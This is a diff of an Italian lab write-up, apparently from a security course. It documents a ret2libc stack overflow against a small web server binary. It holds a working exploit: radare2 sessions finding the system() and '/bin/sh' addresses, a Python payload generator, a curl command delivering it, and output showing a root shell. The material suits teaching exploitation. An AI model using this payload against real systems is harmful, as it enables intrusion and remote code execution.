@@ -3,6 +3,7 @@
 ## OFFSET identification 
 Identificare l'offset della variabile nel frame che va in overflow è stato effettuando traite radare effettuando disassemblato della funzione identificata come vulnerabile da AddressSanitizer, in piu guardando disassemblato è stato possibile identificare quale fosse il buffer vulnerabile che come visto la fase di overflow è in url_decode che lavora su puntatori di variabili istanziate in process pertanto overflow sarà relativo il frame di esecuzione di process:
 ```
+# root@06c96654b96d:/opt# execnoaslr radare2 tiny-lab2
 [0x08048aa0]> aaa
 [x] Analyze all flags starting with sym. and entry0 (aa)
 [x] Analyze function calls (aac)
@@ -85,7 +86,7 @@ Di fatto l'esecuzione della `system()` effettuerà il `pop` dallo stack della st
 
 Di seguito si mostra come identificare l'indirizzo utile della funzione `system()` allocato dal sistema tramite la `Libc` 
 ```
-$ radare2 -d tiny-noexec
+$ execnoaslr radare2 -d tiny-lab2
 Process with PID 18203 started...
 = attach 18203 18203
 bin.baddr 0x08048000
@@ -97,11 +98,12 @@ glibc.fc_offset = 0x00148
 Continue until 0x08049fd0 using 1 bpsize
 hit breakpoint at: 8049fd0
 [0x08049fd0]> dmi libc system
-254 0x00127190 0xf7eff190 GLOBAL   FUNC  102 svcerr_systemerr
-652 0x0003cd10 0xf7e14d10 GLOBAL   FUNC   55 __libc_system
-1510 0x0003cd10 0xf7e14d10   WEAK   FUNC   55 system
+254 0x00127190 0xf7f14190 GLOBAL   FUNC  102 svcerr_systemerr
+652 0x0003cd10 0xf7e29d10 GLOBAL   FUNC   55 __libc_system
+1510 0x0003cd10 0xf7e29d10   WEAK   FUNC   55 system
+
 ```
-L'indirizzo della `system()` risulta quindi essere `0xf7e14d10`
+L'indirizzo della `system()` risulta quindi essere `0xf7e29d10`
 
 
 ## Ricercare string address in Libc
@@ -109,20 +111,22 @@ L'indirizzo della `system()` risulta quindi essere `0xf7e14d10`
 Dovendo utilizzare come parametro della funzione `system()` la stringa `/bin/sh` sarà necessario individuare tale stringa da qualche parte all'interno della libc.
 
 ```
-[0xf7faa000]> dmi
-0x08048000 0x0804b000  /home/rhpco/sandbox/addresssanitizer/tiny-web-server/tiny-noexec
-0xf7dd8000 0xf7faa000  /lib32/libc-2.27.so
+[0x08049fd0]> dmi libc system
+254 0x00127190 0xf7f14190 GLOBAL   FUNC  102 svcerr_systemerr
+652 0x0003cd10 0xf7e29d10 GLOBAL   FUNC   55 __libc_system
+1510 0x0003cd10 0xf7e29d10   WEAK   FUNC   55 system
+
+[0x08049fd0]> dmi
+0x08048000 0x0804b000  /opt/tiny-lab2
+0xf7ded000 0xf7fbf000  /lib32/libc-2.27.so
 0xf7fd6000 0xf7ffc000  /lib32/ld-2.27.so
-[0xf7faa000]> s 0xf7dd8000
-[0xf7dd8000]> / /bin/bash
-Searching 9 bytes in [0xf7dd8000-0xf7faa000]
-hits: 0
-[0xf7dd8000]> / /bin/sh
-Searching 7 bytes in [0xf7dd8000-0xf7faa000]
+[0x08049fd0]> s 0xf7ded000
+[0xf7ded000]> / /bin/sh
+Searching 7 bytes in [0xf7ded000-0xf7fbf000]
 hits: 1
-0xf7f538cf hit6_0 .b/strtod_l.c-c/bin/shexit 0canonica.
+0xf7f688cf hit0_0 .b/strtod_l.c-c/bin/shexit 0canonica.
 ```
-la stringa `/bin/sh` è stata identificata all'indirizzo `0xf7f538cf` e potrà essere utilizzata per la costruzione del payload
+la stringa `/bin/sh` è stata identificata all'indirizzo `0xf7f688cf` e potrà essere utilizzata per la costruzione del payload
 
 ## Construction Payload
 
@@ -136,28 +140,46 @@ Il codice dell'exploit per la generazione del payload sopra proposto risulta ess
 ```
 import struct
 
-addr_shellstr=struct.pack("<I", 0xf7f538cf)
-addr_sys=struct.pack("<I", 0xf7e14d10)
+addr_shellstr=struct.pack("<I", 0xf7f688cf)
+addr_sys=struct.pack("<I", 0xf7e29d10)
 
 print 'A'*524+addr_sys+'B'*4+addr_shellstr
 
 ```
 Mentre l'utilizzo dell'exploit risulta essere: 
 ```
-curl "localhost:9999/`python payload.py`"
+attacker@machine:$ curl "http://localhost:9999/`python payload.py`"
 ```
 Di seguito il risultato ottenuto a seguito dell'esecuzione dell'exploit sul target:
 ```
-/tiny-lab2       
+root@06c96654b96d:/opt# execnoaslr gdb tiny-lab2 
+GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from tiny-lab2...done.
+(gdb) r
+Starting program: /opt/tiny-lab2 
 listen on port 9999, fd is 3
-child pid is 21313
-accept request, fd is 14, pid is 21312
-47.115.104.0:26990 404 - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM��BBBB�8��
-$ uname -a
-Linux darksun 4.15.0-47-generic #50-Ubuntu SMP Wed Mar 13 10:44:52 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+child pid is 55
+accept request, fd is 4, pid is 51
+47.115.104.0:26990 404 - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���BBBBψ��
+# uname -a
+Linux 06c96654b96d 4.15.0-47-generic #50-Ubuntu SMP Wed Mar 13 10:44:52 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# 
 ```
-
-( Nota: potrebbero esserci differenze di offset e indirizzi )
 
 
 // rhpco
